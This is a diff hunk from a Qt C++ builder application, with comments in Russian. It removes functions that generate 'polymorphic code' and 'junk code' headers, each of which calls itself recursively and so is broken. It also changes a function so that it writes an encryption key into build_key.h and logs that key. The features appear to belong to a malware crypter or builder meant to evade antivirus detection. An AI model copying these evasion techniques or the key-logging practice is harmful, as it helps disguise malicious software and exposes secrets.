@@ -1481,53 +1481,23 @@ void MainWindow::replyFinished(QNetworkReply* reply) {
     reply->deleteLater();
 }
 
-// Генерация полиморфного кода
-std::string MainWindow::generatePolymorphicCode() {
-    std::string polyCode = generatePolymorphicCode();
-    std::ofstream outFile("polymorphic_code.h", std::ios::binary);
-    if (outFile.is_open()) {
-        outFile << polyCode;
-        outFile.close();
-        Log("Полиморфный код сгенерирован");
-    } else {
-        Log("Не удалось сгенерировать полиморфный код");
-    }
-    return polyCode; // Возвращаем сгенерированный код
-}
-
 // Генерация заголовка ключей
 void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
-    std::ofstream outFile("build_key.h", std::ios::binary);
+    std::ofstream outFile("../src/build_key.h", std::ios::binary);
     if (outFile.is_open()) {
         outFile << "#ifndef BUILD_KEY_H\n";
         outFile << "#define BUILD_KEY_H\n\n";
         outFile << "#include <array>\n";
         outFile << "#include <string>\n\n";
+        outFile << "const std::string BUILD_KEY = \"" << encryptionKey << "\";\n\n";
         outFile << "std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key);\n";
         outFile << "std::array<unsigned char, 16> GenerateIV();\n\n";
         outFile << "#endif // BUILD_KEY_H\n";
         outFile.close();
-        Log("Заголовок ключей сборки сгенерирован");
+        Log("Заголовок ключей сборки сгенерирован с ключом: " + QString::fromStdString(encryptionKey));
     } else {
         Log("Не удалось сгенерировать заголовок ключей сборки");
     }
-}
-
-// Генерация мусорного кода
-std::string MainWindow::generateJunkCode() {
-    std::string junkCode = generateJunkCode();
-    std::ofstream outFile("junk_code_generated.h", std::ios::binary);
-    if (outFile.is_open()) {
-        outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
-        outFile << "#define JUNK_CODE_GENERATED_H\n\n";
-        outFile << junkCode;
-        outFile << "\n#endif // JUNK_CODE_GENERATED_H\n";
-        outFile.close();
-        Log("Мусорный код сгенерирован и сохранён в junk_code_generated.h");
-    } else {
-        Log("Не удалось сгенерировать мусорный код");
-    }
-    return junkCode; // Возвращаем сгенерированный код
 }
 
 // Копирование иконки в директорию сборки
